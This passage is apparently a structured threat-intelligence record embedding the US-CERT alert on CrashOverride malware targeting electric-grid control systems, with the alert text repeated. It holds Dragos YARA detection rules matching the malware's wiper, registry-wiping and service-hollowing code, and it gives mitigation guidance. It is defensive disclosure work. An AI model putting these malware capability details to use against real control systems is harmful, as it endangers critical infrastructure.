/>strings:<br />$s0 = “SYS_BASCON.COM” fullword nocase wide<br />$s1 = “.pcmp” fullword nocase wide<br />$s2 = “.pcmi” fullword nocase wide<br />$s3 = “.pcmt” fullword nocase wide<br />$s4 = “.cin” fullword nocase wide<br />condition:<br />pe.exports(“Crash”) and any of ($s*)<br />}</code></p><p><code>rule dragos_crashoverride_name_search {<br />meta:<br />description = “CRASHOVERRIDE v1 Suspicious Strings and Export”<br />author = “Dragos Inc”<br />strings:<br />$s0 = “101.dll” fullword nocase wide<br />$s1 = “Crash101.dll” fullword nocase wide<br />$s2 = “104.dll” fullword nocase wide<br />$s3 = “Crash104.dll” fullword nocase wide<br />$s4 = “61850.dll” fullword nocase wide<br />$s5 = “Crash61850.dll” fullword nocase wide<br />$s6 = “OPCClientDemo.dll” fullword nocase wide<br />$s7 = “OPC” fullword nocase wide<br />$s8 = “CrashOPCClientDemo.dll” fullword nocase wide<br />$s9 = “D2MultiCommService.exe” fullword nocase wide<br />$s10 = “CrashD2MultiCommService.exe” fullword nocase wide<br />$s11 = “61850.exe” fullword nocase wide<br />$s12 = “OPC.exe” fullword nocase wide<br />$s13 = “haslo.exe” fullword nocase wide<br />$s14 = “haslo.dat” fullword nocase wide<br />condition:<br />any of ($s*) and pe.exports(“Crash”)<br />}</code></p><p><code>rule dragos_crashoverride_hashes {<br />meta:<br />description = “CRASHOVERRIDE Malware Hashes”<br />author = “Dragos Inc”</code></p><p><code>condition:<br />filesize &lt; 1MB and<br />hash.sha1(0, filesize) == “f6c21f8189ced6ae150f9ef2e82a3a57843b587d” or<br />hash.sha1(0, filesize) == “cccce62996d578b984984426a024d9b250237533” or<br />hash.sha1(0, filesize) == “8e39eca1e48240c01ee570631ae8f0c9a9637187” or<br />hash.sha1(0, filesize) == “2cb8230281b86fa944d3043ae906016c8b5984d9” or<br />hash.sha1(0, filesize) == “79ca89711cdaedb16b0ccccfdcfbd6aa7e57120a” or<br />hash.sha1(0, filesize) == “94488f214b165512d2fc0438a581f5c9e3bd4d4c” or<br />hash.sha1(0, filesize) == “5a5fafbc3fec8d36fd57b075ebf34119ba3bff04” or<br />hash.sha1(0, filesize) == “b92149f046f00bb69de329b8457d32c24726ee00” or<br />hash.sha1(0, filesize) == “b335163e6eb854df5e08e85026b2c3518891eda8”<br />}</code></p><p><code>rule dragos_crashoverride_moduleStrings {<br />meta:<br />description = “IEC-104 Interaction Module Program Strings”<br />author = “Dragos Inc”<br />strings:<br />$s1 = “IEC-104 client: ip=%s; port=%s; ASDU=%u” nocase wide ascii<br />$s2 = “ MSTR -&gt;&gt; SLV” nocase wide ascii<br />$s3 = “ MSTR &lt;&lt;- SLV” nocase wide ascii<br />$s4 = “Unknown APDU format !!!” nocase wide ascii<br />$s5 = “iec104.log” nocase wide ascii<br />condition:<br />any of ($s*)<br />}</code></p><p><code>rule dragos_crashoverride_configReader<br />{<br />meta:<br />description = “CRASHOVERRIDE v1 Config File Parsing”<br />author = “Dragos Inc”<br />strings:<br />$s0 = { 68 e8 ?? ?? ?? 6a 00 e8 a3 ?? ?? ?? 8b f8 83 c4 ?8 }<br />$s1 = { 8a 10 3a 11 75 ?? 84 d2 74 12 }<br />$s2 = { 33 c0 eb ?? 1b c0 83 c8 ?? }<br />$s3 = { 85 c0 75 ?? 8d 95 ?? ?? ?? ?? 8b cf ?? ?? }<br />condition:<br />all of them<br />}</code></p><p><br /><code>rule dragos_crashoverride_configReader<br />{<br />meta:<br />description = “CRASHOVERRIDE v1 Config File Parsing”<br />author = “Dragos Inc”<br />strings:<br />$s0 = { 68 e8 ?? ?? ?? 6a 00 e8 a3 ?? ?? ?? 8b f8 83 c4 ?8 }<br />$s1 = { 8a 10 3a 11 75 ?? 84 d2 74 12 }<br />$s2 = { 33 c0 eb ?? 1b c0 83 c8 ?? }<br />$s3 = { 85 c0 75 ?? 8d 95 ?? ?? ?? ?? 8b cf ?? ?? }<br />condition:<br />all of them<br />}</code></p><p><code>rule dragos_crashoverride_weirdMutex<br />{<br />meta:<br />description = “Blank mutex creation assoicated with CRASHOVERRIDE”<br />author = “Dragos Inc”<br />strings:<br />$s1 = { 81 ec 08 02 00 00 57 33 ff 57 57 57 ff 15 ?? ?? 40 00 a3 ?? ?? ?? 00 85 c0 }<br />$s2 = { 8d 85 ?? ?? ?? ff 50 57 57 6a 2e 57 ff 15 ?? ?? ?? 00 68 ?? ?? 40 00}<br />condition:<br />all of them<br />}</code></p><p><code>rule dragos_crashoverride_serviceStomper<br />{<br />meta:<br />description = “Identify service hollowing and persistence setting”<br />author = “Dragos Inc”<br />strings:<br />$s0 = { 33 c9 51 51 51 51 51 51 ?? ?? ?? }<br />$s1 = { 6a ff 6a ff 6a ff 50 ff 15 24 ?? 40 00 ff ?? ?? ff 15 20 ?? 40 00 }<br />condition:<br />all of them<br />}</code></p><p><code>rule dragos_crashoverride_wiperModuleRegistry<br />{<br />meta:<br />description = “Registry Wiper functionality assoicated with CRASHOVERRIDE”<br />author = “Dragos Inc”<br />strings:<br />$s0 = { 8d 85 a0 ?? ?? ?? 46 50 8d 85 a0 ?? ?? ?? 68 68 0d ?? ?? 50 }<br />$s1 = { 6a 02 68 78 0b ?? ?? 6a 02 50 68 b4 0d ?? ?? ff b5 98 ?? ?? ?? ff 15 04 ?? ?? ?? }<br />$s2 = { 68 00 02 00 00 8d 85 a0 ?? ?? ?? 50 56 ff b5 9c ?? ?? ?? ff 15 00 ?? ?? ?? 85 c0 }<br />condition:<br />all of them<br />}</code></p><p><code>rule dragos_crashoverride_wiperFileManipulation<br />{<br />meta:<br />description = “File manipulation actions associated with CRASHOVERRIDE wip¬er”<br />author = “Dragos Inc”<br />strings:<br />$s0 = { 6a 00 68 80 00 00 00 6a 03 6a 00 6a 02 8b f9 68 00 00 00 40 57 ff 15 1c ?? ?? ?? 8b d8 }<br />$s2 = { 6a 00 50 57 56 53 ff 15 4c ?? ?? ?? 56 }<br />condition:<br />all of them<br />}</code></p>\t\t    \n\t\t    <h3>Impact</h3>\n\t\t    <p>A successful network intrusion can have severe impacts, particularly if the compromise becomes public and sensitive information is exposed. Possible impacts include:</p><ul><li>temporary or permanent loss of sensitive or proprietary information,</li><li>disruption to regular operations,</li><li>financial losses incurred to restore systems and files, and</li><li>potential harm to an organization’s reputation.<br /> </li></ul>\t\t    \n\t\t    <h3>Solution</h3>\n\t\t    <p>Properly implemented defensive techniques and common cyber hygiene practices increase the complexity of barriers that adversaries must overcome to gain unauthorized access to critical information networks and systems. In addition, detection and prevention mechanisms can expose malicious network activity, enabling organizations to contain and respond to intrusions more rapidly. There is no set of defensive techniques or programs that will completely avert all attacks however, layered cybersecurity defenses will aid in reducing an organization’s attack surface and will increase the likelihood of detection. This layered mitigation approach is known as defense-in-depth.<br />NCCIC has based its mitigations and recommendations on its analysis of the public reporting of this malware and will be provide updates as more information becomes available.<br />Critical infrastructure companies should ensure that they are following best practices, which are outlined in the <a href=\"http://ics-cert.us-cert.gov/sites/default/files/documents/Seven Steps to Effectively Defend Industrial Control Systems_S508C.pdf\">Seven Steps to Effectively Defend Industrial Control Systems</a> document produced jointly by DHS, NSA, and FBI.</p><h4>Application Whitelisting</h4><p>Application whitelisting (AWL) can detect and prevent attempted execution of malware uploaded by adversaries. Application whitelisting hardens operating systems and prevents the execution of unauthorized software. The static nature of some systems, such as database servers and human-machine interface (HMI) computers make these ideal candidates to run AWL. NCCIC encourages operators to work with their vendors to baseline and calibrate AWL deployments.<br />Operators may choose to implement directory whitelisting rather than trying to list every possible permutation of applications in an environment. Operators may implement application or application directory whitelisting through Microsoft Software Restriction Policy (SRP), AppLocker, or similar application whitelisting software. Safe defaults allow applications to run from PROGRAMFILES, PROGRAMFILES(X86), SYSTEM32, and any ICS software folders. All other locations should be disallowed unless an exception is granted.</p><h4>Manage Authentication and Authorization</h4><p>This malware exploits the lack of authentication and authorization in common ICS protocols to issue unauthorized commands to field devices. Asset owners/operators should implement authentication and authorization protocols to ensure field devices verify the authenticity of commands before they are actioned. In some instances, legacy hardware may not be capable of implementing these protections. In these cases, asset owners can either leverage ICS firewalls to do stateful inspection and authentication of commands, or upgrade their control field devices.</p><p>Adversaries are increasingly focused on gaining control of legitimate credentials, especially those associated with highly privileged accounts. Compromising these credentials allows adversaries to masquerade as legitimate users, leaving less evidence of compromise than more traditional attack options (i.e., exploiting vulnerabilities or uploading malware). For this reason, operators should implement multi-factor authentication where possible and reduce privileges to only those needed for a user’s duties. If passwords are necessary, operators should implement secure password policies, stressing length over complexity. For all accounts, including system and non-interactive accounts, operators should ensure credentials are unique, and changed, at a minimum, every 90 days.</p><p>NCCIC also recommends that operators require separate credentials for corporate and control network zones and store them in separate trust stores. Operators should never share Active Directory, RSA ACE servers, or other trust stores between corporate and control networks. Specifically, operators should:</p><ul><li>Decrease a threat actor’s ability to access key network resources by implementing the principle of least privilege;</li><li>Limit the ability of a local administrator account to login from a local interactive session (e.g., “Deny access to this computer from the network”) and prevent access via a remote desktop protocol session;</li><li>Remove unnecessary accounts, groups, and restrict root access;</li><li>Control and limit local administration; and</li><li>Make use of the Protected Users Active Directory group in Windows Domains to further secure privileged user accounts against pass-the-hash attacks.</li></ul><h4>Handling Destructive Malware</h4><p>Destructive malware continues to be a threat to both critical infrastructure and business systems. NCCIC encourages organizations to review the <a href=\"https://ics-cert.us-cert.gov/sites/default/files/documents/Destructive_Malware_White_Paper_S508C.pdf\">ICS-CERT destructive malware white paper</a> for detailed mitigation guidance. It is important for organizations to maintain backups of key data, systems, and configurations such as:</p><ul><li>Server gold images,</li><li>ICS Workstation gold configurations,</li><li>Engineering workstation images,</li><li>PLC/RTU configurations,</li><li>Passwords and configuration information, and</li><li>Offline copies of install media for operating systems and control applications.</li></ul><h4>Ensure Proper Configuration/Patch Management</h4><p>Adversaries often target unpatched systems. A configuration/patch management program centered on the safe importation and implementation of trusted patches will help render control systems more secure.</p><p>Such a program will start with an accurate baseline and asset inventory to track what patches are needed. The program will prioritize patching and configuration management of “PC-architecture” machines used in HMI, database server, and engineering workstation roles, as current adversaries have significant cyber capabilities against these systems. Infected laptops are a significant malware vector. Such a program will limit the connection of external laptops to the control network and ideally supply vendors with known-good company laptops. The program will also encourage initial installation of any updates onto a test system that includes malware detection features before the updates are installed on operational systems.</p><p>NCCIC recommends that operators:</p><ul><li>Use best practices when downloading software and patches destined for their control network;</li><li>Take measures to avoid watering hole attacks;</li><li>Use a web Domain Name System (DNS) reputation system;</li><li>Obtain and apply updates from authenticated vendor sites;</li><li>Validate the authenticity of downloads;</li><li>Insist that vendors digitally sign updates, and/or publish hashes via an out-of-bound communications path, and only use this path to authenticate;</li><li>Never load updates from unverified sources; and</li><li>Reduce your attack surface area.</li></ul><p>To the greatest extent possible, NCCIC recommends that operators:</p><ul><li>Isolate ICS networks from any untrusted networks, especially the Internet;</li><li>Lock down all unused ports;</li><li>Turn off all unused services; and</li><li>Only allow real-time connectivity to external networks if there is a defined business requirement or control function.<ul><li>If one-way communication can accomplish a task, operators should use optical separation (“data diode”).</li><li>If bidirectional communication is necessary, operators should use a single open port over a restricted network path.</li></ul></li></ul><h4>Build a Defendable Environment</h4><p>Building a defendable environment will help limit the impact from network perimeter breaches. NCCIC recommends operators segment networks into logical enclaves and restrict host-to-host communications paths. This can prevent adversaries from expanding their access, while allowing the normal system communications to continue operating. Enclaving limits possible damage, as threat actors cannot use compromised systems to reach and contaminate systems in other enclaves. Containment provided by enclaving also makes incident cleanup significantly less costly.</p><p>If one-way data transfer from a secure zone to a less secure zone is required, operators should consider using approved removable media instead of a network connection. If real-time data transfer is required, operators should consider using optical separation technologies. This allows replication of data without placing the control system at risk.</p><p>Additional details on effective strategies for building a defendable ICS network can be found in the <a href=\"http://ics-cert.us-cert.gov/Abstract-Defense-Depth-RP\">ICS-CERT Defense-in-Depth Recommended Practice</a>.</p><h4>Implement Secure Remote Access</h4><p>Some adversaries are effective at gaining remote access into control systems, finding obscure access vectors, even “hidden back doors” intentionally created by system operators. Operators should remove such accesses wherever possible, especially modems, as these are fundamentally insecure.<br />Operators should:</p><ul><li>Limit any accesses that remain;</li><li>Where possible, implement “monitoring only” access enforced by data diodes, and not rely on “read only” access enforced by software configurations or permissions;</li><li>Not allow remote persistent vendor connections into the control network;</li><li>Require any remote access to be operator controlled, time limited, and procedurally similar to “lock out, tag out”;</li><li>Use the same remote access paths for vendor and employee connections; do not allow double standards; and</li><li>Use two-factor authentication if possible, avoiding schemes where both tokens are similar and can be easily stolen (e.g., password and soft certificate).</li></ul><h4>Monitor and Respond</h4><p>Defending a network against modern threats requires actively monitoring for adversarial penetration and quickly executing a prepared response. Operators should:</p><ul><li>Consider establishing monitoring programs in the following key places: at the Internet boundary; at the business to Control DMZ boundary; at the Control DMZ to control LAN boundary; and inside the Control LAN;</li><li>Watch IP traffic on ICS boundaries for abnormal or suspicious communications;</li><li>Monitor IP traffic within the control network for malicious connections or content;</li><li>Use host-based products to detect malicious software and attack attempts;<ul><li>Use login analysis (e.g., time and place) to detect stolen credential usage or improper access, verifying all anomalies with quick phone calls;</li><li>Watch account and user administration actions to detect access control manipulation;</li></ul></li><li>Have a response plan for when adversarial activity is detected; and<ul><li>Such a plan may include disconnecting all Internet connections, running a properly scoped search for malware, disabling affected user accounts, isolating suspect systems, and immediately resetting 100 percent of passwords.</li><li>Such a plan may also define escalation triggers and actions, including incident response, investigation, and public affairs activities.</li></ul></li><li>Have a restoration plan, including “gold disks” ready to restore systems to known good states.<br /> </li></ul>\t\t    \n\t\t    <h3>References</h3>\n\t\t    <ul>\n            \t\t    \t<li><a href=\"https://www.welivesecurity.com/wp-content/uploads/2017/06/Win32_Industroyer.pdf\">[1] ESET: WIN32/INDUSTROYER – A New Threat for Industrial Control Systems</a></li>\n            \t\t    \t<li><a href=\"https://www.dragos.com/blog/crashoverride/\">[2] Dragos: CRASHOVERRIDE</a></li>\n            \t\t    </ul>\n\t\t    \n\t\t    <h3>Revision History</h3>\n\t\t    <ul>\n\t\t    \t\t    \t<li>June 12, 2017: Initial Release</li>\n\t\t    \t\t\t    \t<li>June 13, 2017: Updated IOCs (both STIX and CSV formats)</li>\n\t\t    \t\t\t    \t<li>July 7, 2017: Updated IOCs (both STIX and CSV formats)</li>\n\t\t    \t\t\t    \t<li>July 21, 2017: Corrected typographical error</li>\n\t\t    \t\t\t    \t<li>July 24, 2017: Corrected links to downloadable IOC files</li>\n\t\t    \t\t\t    </ul>\n\t\t    <hr />\n\t\t    <p>This product is provided subject to this <a href=\"http://www.us-cert.gov/privacy/notification\">Notification</a> and this <a href=\"http://www.us-cert.gov/privacy/\">Privacy &amp; Use</a> policy.</p>\t\t    <br />",
			"external_references": [
				{
					"external_id": "9042 at https://www.us-cert.gov",
					"url": "https://www.us-cert.gov/ncas/alerts/TA17-163A",
					"source_name": "open source",
					"description": "Original release date: June 12, 2017 | Last revised: July 27, 2017<br />\n\t\t    <h3>Systems Affected</h3>\n\t\t    <p>Industrial Control Systems</p>\t\t    \n\t\t    <h3>Overview</h3>\n\t\t    <p>The National Cybersecurity and Communications Integration Center (NCCIC) is aware of public reports from ESET and Dragos outlining a new, highly capable Industrial Controls Systems (ICS) attack platform that was reportedly used in 2016 against critical infrastructure in Ukraine. As reported by <a href=\"https://www.welivesecurity.com/wp-content/uploads/2017/06/Win32_Industroyer.pdf\">ESET</a> and <a href=\"https://www.dragos.com/blog/crashoverride/\">Dragos</a>, the CrashOverride malware is an extensible platform that could be used to target critical infrastructure sectors. NCCIC is working with its partners to validate the ESET and Dragos analysis, and develop a better understanding of the risk this new malware poses to U.S. critical infrastructure.</p><p>Although this activity is still under investigation, NCCIC is sharing this report to provide organizations with detection and mitigation recommendations to help prevent future compromises within their critical infrastructure networks. NCCIC continues to work with interagency and international partners on this activity and will provide updates as information becomes available.</p><p>For a downloadable copy of indicators of compromise (IOCs), see:</p><ul><li>IOCs (<a href=\"https://www.us-cert.gov/sites/default/files/publications/TA-17-163A_IOCs.csv\">.csv</a>)</li><li>IOCs (<a href=\"https://www.us-cert.gov/sites/default/files/publications/TA-17-163A_IOCs.stix.XML\">.stix</a>)</li></ul><p>To report activity related to this Alert, please contact NCCIC at <a href=\"https://www.us-cert.govmailto:NCCICCustomerService@hq.dhs.gov\">NCCICCustomerService@hq.dhs.gov</a> or 1-888-282-0870.</p><h4>Risk Evaluation</h4><table border=\"1\" cellpadding=\"0\" cellspacing=\"0\" class=\"general-table\" style=\"width: 100%;\"><tbody><tr><td>NCCIC Cyber Incident Scoring System (NCISS) Rating Priority Level (Color)</td></tr><tr><td>Yellow (Medium)</td></tr><tr><td>A medium priority incident may affect public health or safety, national security, economic security, foreign relations, civil liberties, or public confidence.</td></tr></tbody></table><h4>Details</h4><p>There is no evidence to suggest this malware has affected U.S. critical infrastructure. However, the tactics, techniques, and procedures (TTPs) described as part of the CrashOverride malware could be modified to target U.S. critical information networks and systems.</p>\t\t    \n\t\t    <h3>Description</h3>\n\t\t    <h4>Technical Analysis</h4><p>CrashOverride malware represents a scalable, capable platform. The modules and capabilities publically reported appear to focus on organizations using ICS protocols IEC101, IEC104, and IEC61850, which are more commonly used outside the United States in electric power control systems. The platform fundamentally abuses the functionality of a targeted ICS system’s legitimate control system to achieve its intended effect. While the known capabilities do not appear to be U.S.-focused, it is important to recognize that the general TTPs used in CrashOverride could be leveraged with modified technical implementations to affect U.S.-based critical infrastructure. With further modification, CrashOverride or similar malware could have implications beyond electric power so all critical infrastructure organizations should be evaluating their systems to susceptibilities in the TTPs outlined. The malware has several reported capabilities:</p><ol><li>Issues valid commands directly to remote terminal units (RTUs) over ICS protocols. As reported by Dragos, one such command sequence toggles circuit breakers in a rapid open-close-open-close pattern. This could create conditions where individual utilities may island from infected parties, potentially resulting in a degradation of grid reliability.</li><li>Denies service to local serial COM ports on windows devices, therefore preventing legitimate communications with field equipment over serial from the affected device.</li><li>Scans and maps ICS environment using a variety of protocols, including Open Platform Communications (OPC). This significantly improves the payload’s probability of success.</li><li>Could exploit Siemens relay denial-of-service (DoS) vulnerability, leading to a shutdown of the relay. In this instance, the relay would need to be manually reset to restore functionality.</li><li>Includes a wiper module in the platform that renders windows systems inert, requiring a rebuild or backup restoration.</li></ol><h4>Detection</h4><p>As CrashOverride is a second stage malware capability and has the ability to operate independent of initial C2, traditional methods of detection may not be sufficient to detect infections prior to the malware executing. As a result, organizations are encouraged to implement behavioral analysis techniques to attempt to identify precursor activity to CrashOverride. As additional information becomes available on stage one infection vectors and TTPs, this alert will be updated.</p><p>NCCIC is providing a compilation of IOCs (see links above) from a variety of sources to aid in the detection of this malware. The sources provided do not constitute an exhaustive list and the U.S. Government does not endorse or support any particular product or vendor’s information referenced in this report. However, NCCIC has included this data to ensure wide distribution of the most comprehensive information available and will provide updates as warranted.</p><h5>Signatures</h5><p><code>import “pe”<br />import “hash”</code></p><p><code>rule dragos_crashoverride_exporting_dlls<br />{<br />meta:<br />description = “CRASHOVERRIDE v1 Suspicious Export”<br />author = “Dragos Inc”<br />condition:<br />pe.exports(“Crash”) &amp; pe.characteristics<br />}</code></p><p><code>rule dragos_crashoverride_suspcious<br />{<br />meta:<br />description = “CRASHOVERRIDE v1 Wiper”<br />author = “Dragos Inc”<br />strings:<br />$s0 = “SYS_BASCON.COM” fullword nocase wide<br />$s1 = “.pcmp” fullword nocase wide<br />$s2 = “.pcmi” fullword nocase wide<br />$s3 = “.pcmt” fullword nocase wide<br />$s4 = “.cin” fullword nocase wide<br />condition:<br />pe.exports(“Crash”) and any of ($s*)<br />}</code></p><p><code>rule dragos_crashoverride_name_search {<br />meta:<br />description = “CRASHOVERRIDE v1 Suspicious Strings and Export”<br />author = “Dragos Inc”<br />strings:<br />$s0 = “101.dll” fullword nocase wide<br />$s1 = “Crash101.dll” fullword nocase wide<br />$s2 = “104.dll” fullword nocase wide<br />$s3 = “Crash104.dll” fullword nocase wide<br />$s4 = “61850.dll” fullword nocase wide<br />$s5 = “Crash61850.dll” fullword nocase wide<br />$s6 = “OPCClientDemo.dll” fullword nocase wide<br />$s7 = “OPC” fullword nocase wide<br />$s8 = “CrashOPCClientDemo.dll” fullword nocase wide<br />$s9 = “D2MultiCommService.exe” fullword nocase wide<br />$s10 = “CrashD2MultiCommService.exe” fullword nocase wide<br />$s11 = “61850.exe” fullword nocase wide<br />$s12 = “OPC.exe” fullword nocase wide<br />$s13 = “haslo.exe” fullword nocase wide<br />$s14 = “haslo.dat” fullword nocase wide<br />condition:<br />any of ($s*) and pe.exports(“Crash”)<br />}</code></p><p><code>rule dragos_crashoverride_hashes {<br />meta:<br />description = “CRASHOVERRIDE Malware Hashes”<br />author = “Dragos Inc”</code></p><p><code>condition:<br />filesize &lt; 1MB and<br />hash.sha1(0, filesize) == “f6c21f8189ced6ae150f9ef2e82a3a57843b587d” or<br />hash.sha1(0, filesize) == “cccce62996d578b984984426a024d9b250237533” or<br />hash.sha1(0, filesize) == “8e39eca1e48240c01ee570631ae8f0c9a9637187” or<br />hash.sha1(0, filesize) == “2cb8230281b86fa944d3043ae906016c8b5984d9” or<br />hash.sha1(0, filesize) == “79ca89711cdaedb16b0ccccfdcfbd6aa7e57120a” or<br />hash.sha1(0, filesize) == “94488f214b165512d2fc0438a581f5c9e3bd4d4c” or<br />hash.sha1(0, filesize) == “5a5fafbc3fec8d36fd57b075ebf34119ba3bff04” or<br />hash.sha1(0, filesize) == “b92149f046f00bb69de329b8457d32c24726ee00” or<br />hash.sha1(0, filesize) == “b335163e6eb854df5e08e85026b2c3518891eda8”<br />}</code></p><p><code>rule dragos_crashoverride_moduleStrings {<br />meta:<br />description = “IEC-104 Interaction Module Program Strings”<br />author = “Dragos Inc”<br />strings:<br />$s1 = “IEC-104 client: ip=%s; port=%s; ASDU=%u” nocase wide ascii<br />$s2 = “ MSTR -&gt;&gt; SLV” nocase wide ascii<br />$s3 = “ MSTR &lt;&lt;- SLV” nocase wide ascii<br />$s4 = “Unknown APDU format !!!” nocase wide ascii<br />$s5 = “iec104.log” nocase wide ascii<br />condition:<br />any of ($s*)<br />}</code></p><p><code>rule dragos_crashoverride_configReader<br />{<br />meta:<br />description = “CRASHOVERRIDE v1 Config File Parsing”<br />author = “Dragos Inc”<br />strings:<br />$s0 = { 68 e8 ?? ?? ?? 6a 00 e8 a3 ?? ?? ?? 8b f8 83 c4 ?8 }<br />$s1 = { 8a 10 3a 11 75 ?? 84 d2 74 12 }<br />$s2 = { 33 c0 eb ?? 1b c0 83 c8 ?? }<br />$s3 = { 85 c0 75 ?? 8d 95 ?? ?? ?? ?? 8b cf ?? ?? }<br />condition:<br />all of them<br />}</code></p><p><br /><code>rule dragos_crashoverride_configReader<br />{<br />meta:<br />description = “CRASHOVERRIDE v1 Config File Parsing”<br />author = “Dragos Inc”<br />strings:<br />$s0 = { 68 e8 ?? ?? ?? 6a 00 e8 a3 ?? ?? ?? 8b f8 83 c4 ?8 }<br />$s1 = { 8a 10 3a 11 75 ?? 84 d2 74 12 }<br />$s2 = { 33 c0 eb ?? 1b c0 83 c8 ?? }<br />$s3 = { 85 c0 75 ?? 8d 95 ?? ?? ?? ?? 8b cf ?? ?? }<br />condition:<br />all of them<br />}</code></p><p><code>rule dragos_crashoverride_weirdMutex<br />{<br />meta:<br />description = “Blank mutex creation assoicated with CRASHOVERRIDE”<br />author = “Dragos Inc”<br />strings:<br />$s1 = { 81 ec 08 02 00 00 57 33 ff 57 57 57 ff 15 ?? ?? 40 00 a3 ?? ?? ?? 00 85 c0 }<br />$s2 = { 8d 85 ?? ?? ?? ff 50 57 57 6a 2e 57 ff 15 ?? ?? ?? 00 68 ?? ?? 40 00}<br />condition:<br />all of them<br />}</code></p><p><code>rule dragos_crashoverride_serviceStomper<br />{<br />meta:<br />description = “Identify service hollowing and persistence setting”<br />author = “Dragos Inc”<br />strings:<br />$s0 = { 33 c9 51 51 51 51 51 51 ?? ?? ?? }<br />$s1 = { 6a ff 6a ff 6a ff 50 ff 15 24 ?? 40 00 ff ?? ?? ff 15 20 ?? 40 00 }<br />condition:<br />all of them<br />}</code></p><p><code>rule dragos_crashoverride_wiperModuleRegistry<br />{<br />meta:<br />description = “Registry Wiper functionality assoicated with CRASHOVERRIDE”<br />author = “Dragos Inc”<br />strings:<br />$s0 = { 8d 85 a0 ?? ?? ?? 46 50 8d 85 a0 ?? ?? ?? 68 68 0d ?? ?? 50 }<br />$s1 = { 6a 02 68 78 0b ?? ?? 6a 02 50 68 b4 0d ?? ?? ff b5 98 ?? ?? ?? ff 15 04 ?? ?? ?? }<br />$s2 = { 68 00 02 00 00 8d 85 a0 ?? ?? ?? 50 56 ff b5 9c ?? ?? ?? ff 15 00 ?? ?? ?? 85 c0 }<br />condition:<br />all of them<br />}</code></p><p><code>rule dragos_crashoverride_wiperFileManipulation<br />{<br />meta:<br />description = “File manipulation actions associated with CRASHOVERRIDE wip¬er”<br />author = “Dragos Inc”<br />strings:<br />$s0 = { 6a 00 68 80 00 00 00 6a 03 6a 00 6a 02 8b f9 68 00 00 00 40 57 ff 15 1c ?? ?? ?? 8b d8 }<br />$s2 = { 6a 00 50 57 56 53 ff 15 4c ?? ?? ?? 56 }<br />condition:<br />all of them<br />}</code></p>\t\t    \n\t\t    <h3>Impact</h3>\n\t\t    <p>A successful network intrusion can have severe impacts, particularly if the compromise becomes public and sensitive information is exposed. Possible impacts include:</p><ul><li>temporary or permanent loss of sensitive or proprietary information,</li><li>disruption to regular operations,</li><li>financial losses incurred to restore systems and files, and</li><li>potential harm to an organization’s reputation.<br /> </li></ul>\t\t    \n\t\t    <h3>Solution</h3>\n\t\t    <p>Properly implemented defensive techniques and common cyber hygiene practices increase the complexity of barriers that adversaries must overcome to gain unauthorized access to critical information networks and systems. In addition, detection and prevention mechanisms can expose malicious network activity, enabling organizations to contain and respond to intrusions more rapidly. There is no set of defensive techniques or programs that will completely avert all attacks however, layered cybersecurity defenses will aid in reducing an organization’s attack surface and will increase the likelihood of detection. This layered mitigation approach is known as defense-in-depth.<br />NCCIC has based its mitigations and recommendations on its analysis of the public reporting of this malware and will be provide updates as more information becomes available.<br />Critical infrastructure companies should ensure that they are following best practices, which are outlined in the <a href=\"http://ics-cert.us-cert.gov/sites/default/files/documents/Seven Steps to Effectively Defend Industrial Control Systems_S508C.pdf\">Seven Steps to Effectively Defend Industrial Control Systems</a> document produced jointly by DHS, NSA, and FBI.</p><h4>Application Whitelisting</h4><p>Application whitelisting (AWL) can detect and prevent attempted execution of malware uploaded by adversaries. Application whitelisting hardens operating systems and prevents the execution of unauthorized software. The static nature of some systems, such as database servers and human-machine interface (HMI) computers make these ideal candidates to run AWL. NCCIC encourages operators to work with their vendors to baseline and calibrate AWL deployments.<br />Operators may choose to implement directory whitelisting rather than trying to list every possible permutation of applications in an environment. Operators may implement application or application directory whitelisting through Microsoft Software Restriction Policy (SRP), AppLocker, or similar application whitelisting software. Safe defaults allow applications to run from PROGRAMFILES, PROGRAMFILES(X86), SYSTEM32, and any ICS software folders. All other locations should be disallowed unless an exception is granted.</p><h4>Manage Authentication and Authorization</h4><p>This malware exploits the lack of authentication and authorization in common ICS protocols to issue unauthorized commands to field devices. Asset owners/operators should implement authentication and authorization protocols to ensure field devices verify the authenticity of commands before they are actioned. In some instances, legacy hardware may not be capable of implementing these protections. In these cases, asset owners can either leverage ICS firewalls to do stateful inspection and authentication of commands, or upgrade their control field devices.</p><p>Adversaries are increasingly focused on gaining control of legitimate credentials, especially those associated with highly privileged accounts. Compromising these credentials allows adversaries to masquerade as legitimate users, leaving less evidence of compromise than more traditional attack options (i.e., exploiting vulnerabilities or uploading malware). For this reason, operators should implement multi-factor authentication where possible and reduce privileges to only those needed for a user’s duties. If passwords are necessary, operators should implement secure password policies, stressing length over complexity. For all accounts, including system and non-interactive accounts, operators should ensure credentials are unique, and changed, at a minimum, every 90 days.</p><p>NCCIC also recommends that operators require separate credentials for corporate and control network zones and store them in separate trust stores. Operators should never share Active Directory, RSA ACE servers, or other trust stores between corporate and control networks. Specifically, operators should:</p><ul><li>Decrease a threat actor’s ability to access key network resources by implementing the principle of least privilege;</li><li>Limit the ability of a local administrator account to login from a local interactive session (e.g., “Deny access to this computer from the network”) and prevent access via a remote desktop protocol session;</li><li>Remove unnecessary accounts, groups, and restrict root access;</li><li>Control and limit local administration; and</li><li>Make use of the Protected Users Active Directory group in Windows Domains to further secure privileged user accounts against pass-the-hash attacks.</li></ul><h4>Handling Destructive Malware</h4><p>Destructive malware continues to be a threat to both critical infrastructure and business systems. NCCIC encourages organizations to review the <a href=\"https://ics-cert.us-cert.gov/sites/default/files/documents/Destructive_Malware_White_Paper_S508C.pdf\">ICS-CERT destructive malware white paper</a> for detailed mitigation guidance. It is important for organizations to maintain backups of key data, systems, and configurations such as:</p><ul><li>Server gold images,</li><li>ICS Workstation gold configurations,</li><li>Engineering workstation images,</li><li>PLC/RTU configurations,</li><li>Passwords and configuration information, and</li><li>Offline copies of install media for operating systems and control applications.</li></ul><h4>Ensure Proper Configuration/Patch Management</h4><p>Adversaries often target unpatched systems. A configuration/patch management program centered on the safe importation and implementation of trusted patches will help render control systems more secure.</p><p>Such a program will start with an accurate baseline and asset inventory to track what patches are needed. The program will prioritize patching and configuration management of “PC-architecture” machines used in HMI, database server, and engineering workstation roles, as current adversaries have significant cyber capabilities against these systems. Infected laptops are a significant malware vector. Such a program will limit the connection of external laptops to the control network and ideally supply vendors with known-good company laptops. The program will also encourage initial installation of any updates onto a test system that includes malware detection features before the updates are installed on operational systems.</p><p>NCCIC recommends that operators:</p><ul><li>Use best practices when downloading software and patches destined for their control network;</li><li>Take measures to avoid watering hole attacks;</li><li>Use a web Domain Name System (DNS) reputation system;</li><li>Obtain and apply updates from authenticated vendor 